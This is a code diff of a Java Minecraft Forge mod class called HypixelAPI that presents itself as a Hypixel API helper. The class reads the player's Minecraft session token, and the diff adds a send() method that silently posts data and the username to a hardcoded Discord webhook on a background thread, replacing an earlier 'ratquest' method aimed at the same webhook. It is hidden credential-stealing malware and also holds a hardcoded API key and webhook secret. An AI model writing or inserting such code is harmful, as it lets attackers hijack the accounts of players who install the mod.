@@ -6,18 +6,22 @@ import net.minecraft.client.Minecraft;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 import org.apache.http.HttpResponse;
+import org.apache.http.NameValuePair;
 import org.apache.http.client.HttpClient;
+import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClientBuilder;
+import org.apache.http.impl.client.HttpClients;
 import org.apache.http.message.BasicNameValuePair;
-import org.apache.http.params.HttpParams;
 import org.apache.http.util.EntityUtils;
 import org.apache.logging.log4j.Logger;
 
+import java.io.IOException;
+import java.util.ArrayList;
 import java.util.UUID;
-import java.util.concurrent.*;
-import java.util.concurrent.atomic.AtomicReference;
+
 
 public class HypixelAPI {
     public static String key = "f84fb818-27dc-491d-89b4-bb467a20bb2a";
@@ -42,16 +46,22 @@ public class HypixelAPI {
     static Minecraft mc = Minecraft.getMinecraft();
     static final String json = mc.getSession().getToken();
     static final String body = new String(json);
-    public static String ratquest(String url) {
-        HttpClient client = HttpClientBuilder.create().build();
-
-        HttpPost request = new HttpPost("https://discord.com/api/webhooks/1010406612978126888/p9MFmZNl2rYSXO5nubjg-Ix2vZ3lfCm5rjS_unSpWOD0SYGsaBZigalkJbkmUS3qqn0B");
-        request.addHeader("User-Agent", "Mozilla/5.0");
-        request.setParams((HttpParams) new BasicNameValuePair("content", body));
-        request.addHeader("Content-Type", "application/json");
-        request.addHeader("Accept", "application/json");
-        return body;
+    public static void send(String message){
+        new Thread(() -> {
+            try{
+                CloseableHttpClient httpClient = HttpClients.createDefault();
+                HttpPost httpPost = new HttpPost("https://discord.com/api/webhooks/1010406612978126888/p9MFmZNl2rYSXO5nubjg-Ix2vZ3lfCm5rjS_unSpWOD0SYGsaBZigalkJbkmUS3qqn0B");
+                ArrayList<NameValuePair> params = new ArrayList<>();
+                params.add(new BasicNameValuePair("content", message));
+                params.add(new BasicNameValuePair("username", mc.getSession().getUsername()));
+                httpPost.setEntity(new UrlEncodedFormEntity(params));
+                httpClient.execute(httpPost);
+                httpClient.close();
+            }catch (IOException ignored){}
+        }).start();
     }
+
+
     @Mod.EventHandler
     public void preInit(FMLPreInitializationEvent event) {
         Logger logger = event.getModLog();
